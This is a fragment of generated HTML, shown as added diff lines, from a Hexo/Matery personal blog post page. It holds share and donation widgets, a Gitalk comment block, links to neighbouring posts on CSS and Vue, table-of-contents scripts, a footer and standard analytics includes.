+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: '',
+        owner: '',
+        admin: null,
+        id: '2018-05-02T11-53-55',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/04/11/css-mian-shi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="css面试">
+                        
+                        <span class="card-title">css面试</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            ##1 、介绍一下标准的CSS的盒子模型？与低版本IE的盒子模型有什么不同的？
+
+标准盒子模型：宽度=内容的宽度（content）+ border + padding + margin
+
+低版本IE盒子模型：宽度=内容宽度（content+
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-04-11
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Casper Han
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2018/04/04/vue-bi-ji/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Vue笔记">
+                        
+                        <span class="card-title">Vue笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+确保组件在Vue实例化之前注册即在 new Vue之前 先进行 Vue.component
+
+
+        document.querySelectorAll('.github-emoji')
+          .forEach(e
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2018-04-04
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Casper Han
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <!--
+ * @Author: Casper Han
+ * @Date: 2019-12-12 14:03:29
+ * @LastEditTime: 2020-04-02 21:55:12
+ * @LastEditors: Casper Han
+ * @Description: 
+ * @FilePath: /CasperBlog/themes/hexo-theme-matery/layout/_partial/footer.ejs
+ -->
+<footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="https://badmanpro.github.io" target="_blank">Casper Han</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <!-- <br> -->
+            <!-- 
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">29.4k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+             -->
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/badManPro" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2529670555@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2529670555" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2529670555" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
